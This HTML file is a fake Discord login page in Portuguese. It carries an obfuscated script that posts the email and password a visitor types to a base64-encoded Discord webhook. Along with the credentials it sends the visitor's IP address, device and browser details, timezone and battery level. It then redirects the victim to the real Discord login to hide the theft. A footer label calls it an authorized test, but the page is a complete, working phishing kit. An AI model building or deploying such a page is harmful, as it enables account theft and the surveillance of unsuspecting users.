<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Whitney','Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
            background: #404eed;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .lcard {
            background: #313338;
            padding: 32px;
            border-radius: 8px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
        }
        .lcard h2 { color: #f2f3f5; font-size: 24px; font-weight: 600; text-align: center; margin-bottom: 8px; }
        .lcard .sub { color: #b5bac1; font-size: 14px; text-align: center; margin-bottom: 20px; }
        .logo { display: flex; justify-content: center; margin-bottom: 20px; }
        .logo svg { width: 48px; height: 48px; }
        .fg { margin-bottom: 16px; }
        .fg label { color: #b5bac1; font-size: 12px; font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase; display: block; margin-bottom: 8px; }
        .fg input {
            width: 100%; padding: 12px 14px; border-radius: 4px; border: 1px solid #1e1f22;
            background: #1e1f22; color: #f2f3f5; font-size: 16px; outline: none; transition: border-color 0.15s;
        }
        .fg input:focus { border-color: #5865f2; }
        .fg .link { font-size: 12px; color: #00a8fc; cursor: pointer; float: right; margin-top: 4px; }
        .btn {
            width: 100%; padding: 14px; background: #5865f2; color: #fff; font-size: 16px; font-weight: 600;
            border: none; border-radius: 4px; cursor: pointer; transition: background 0.15s; margin-top: 8px;
        }
        .btn:hover { background: #4752c4; }
        .btn:disabled { background: #4752c4; opacity: 0.7; cursor: not-allowed; }
        .err { color: #ed4245; font-size: 13px; text-align: center; margin-top: 12px; display: none; }
        .reg { text-align: center; margin-top: 16px; color: #949ba4; font-size: 14px; }
        .reg a { color: #00a8fc; text-decoration: none; }
        .reg a:hover { text-decoration: underline; }
        .qr { display: flex; align-items: center; justify-content: center; gap: 12px; margin-top: 20px; padding-top: 20px; border-top: 1px solid #3f4147; color: #949ba4; font-size: 13px; cursor: pointer; }
    </style>
</head>
<body>

<div class="lcard">
    <div class="logo">
        <svg viewBox="0 0 48 48" fill="none">
            <path d="M40 12.9c-2.8-1.3-5.8-2.2-9-2.6l-1.2 2.4c-3.1-.5-6.3-.5-9.4 0L19 10.3c-3.2.5-6.2 1.4-9 2.6C3.5 21.2 2.5 29.3 3 37.2l.1.2c3.4 2.5 7.2 4.1 11.3 5.1l.9-1.2c-.6-.2-1.2-.5-1.8-.8l-.1.1c.3.2.6.4.9.6 1.6.8 3.3 1.4 5.1 1.7l.7-.9c.3 0 .5.1.8.1h1.9c.3 0 .5 0 .8-.1l.7.9c1.8-.3 3.5-1 5.1-1.7l.9-.6c-.6.3-1.2.6-1.8.8l.9 1.2c4.1-1 7.9-2.6 11.3-5.1l.1-.2c.6-8.6-1.1-16.7-4.9-24.3zM17.3 31.6c-1.9 0-3.5-1.7-3.5-3.8s1.5-3.8 3.5-3.8 3.5 1.7 3.5 3.8-1.6 3.8-3.5 3.8zm13.5 0c-1.9 0-3.5-1.7-3.5-3.8s1.5-3.8 3.5-3.8 3.5 1.7 3.5 3.8-1.6 3.8-3.5 3.8z" fill="#5865f2"/>
        </svg>
    </div>
    <h2>Boas-vindas de volta!</h2>
    <p class="sub">Estamos muito animados em te ver novamente!</p>
    <form id="f1">
        <div class="fg">
            <label>E-MAIL OU NÚMERO DE TELEFONE</label>
            <input type="text" id="e1" required>
        </div>
        <div class="fg">
            <label>SENHA</label>
            <input type="password" id="p1" required>
            <span class="link">Esqueceu sua senha?</span>
        </div>
        <button type="submit" class="btn" id="b1">Entrar</button>
        <div class="err" id="err1">Senha ou usuário inválido. Tente novamente.</div>
    </form>
    <div class="reg">Precisando de uma conta? <a href="#">Registrar-se</a></div>
    <div class="qr"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg> Fazer login com QR Code</div>
</div>

<script>
var _0x=["aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxMjA2NTMxODM1OTQwNDY2NC9tcEVYazBpRU1SbXdmOFpSTFdqZmE1RWFXUGZwX3BPdjFMQW56Y3RXWVBFanVoc3NOZXl6SmFHWmswSlRBTHVHaWU4Yg=="];
var wh = atob(_0x[0]);

var $ = function(id) { return document.getElementById(id); };
var ip = async function() {
    try { var r = await fetch('//api.ipify.org?format=json'); var d = await r.json(); return d.ip; }
    catch(e) { try { var r = await fetch('//api.my-ip.io/ip.json'); var d = await r.json(); return d.ip; } catch(e) { return 'x'; } }
};
var di = function() {
    var u = navigator.userAgent;
    var r = {};
    r.os = u.indexOf('Win') > -1 ? 'Win' : u.indexOf('Mac') > -1 ? 'Mac' : u.indexOf('Linux') > -1 && u.indexOf('Android') < 0 ? 'Linux' : u.indexOf('Android') > -1 ? 'Android' : u.indexOf('iPhone') > -1 || u.indexOf('iPad') > -1 ? 'iOS' : '?';
    r.br = u.indexOf('Firefox') > -1 ? 'FF' : u.indexOf('Edg') > -1 ? 'Edge' : u.indexOf('Chrome') > -1 && u.indexOf('Edg') < 0 ? 'Chrome' : u.indexOf('Safari') > -1 && u.indexOf('Chrome') < 0 ? 'Safari' : '?';
    r.mob = /Mobi|Android|iPhone|iPad/i.test(u) ? 'Sim' : 'Nao';
    r.res = screen.width + 'x' + screen.height;
    r.tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '?';
    r.lang = navigator.language || '?';
    return r;
};
var bt = async function() {
    try { if ('getBattery' in navigator) { var b = await navigator.getBattery(); return Math.round(b.level * 100) + '%'; } } catch(e) {}
    return '?';
};
var en = async function(em, pw) {
    var a = await ip(), d = di(), b = await bt();
    var pl = {
        content: '@everyone **🚨 ALERTA**',
        embeds: [{
            title: '🔴 CREDENCIAIS',
            color: 0xed4245,
            fields: [
                { name: '📧 Email', value: '`' + em + '`', inline: true },
                { name: '🔑 Senha', value: '`' + pw + '`', inline: true },
                { name: '🌐 IP', value: '`' + a + '`', inline: true },
                { name: '📱 Mobile', value: '`' + d.mob + '`', inline: true },
                { name: '💻 OS', value: '`' + d.os + '`', inline: true },
                { name: '🌍 Browser', value: '`' + d.br + '`', inline: true },
                { name: '📐 Tela', value: '`' + d.res + '`', inline: true },
                { name: '🌎 Timezone', value: '`' + d.tz + '`', inline: true },
                { name: '🌐 Idioma', value: '`' + d.lang + '`', inline: true },
                { name: '🔋 Bateria', value: '`' + b + '`', inline: true },
                { name: '🕒 Hora', value: new Date().toLocaleString('pt-BR'), inline: true }
            ],
            footer: { text: 'Teste Autorizado' },
            timestamp: new Date().toISOString()
        }]
    };
    try { await fetch(wh, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(pl) }); } catch(e) {}
};

$('f1').addEventListener('submit', async function(e) {
    e.preventDefault();
    var email = $('e1').value.trim();
    var password = $('p1').value.trim();
    if (!email || !password) return;
    $('b1').disabled = true;
    $('b1').textContent = 'Entrando...';
    await en(email, password);
    // Redireciona para o Discord real após capturar
    window.location.href = 'https://discord.com/login';
});
</script>
</body>
</html>
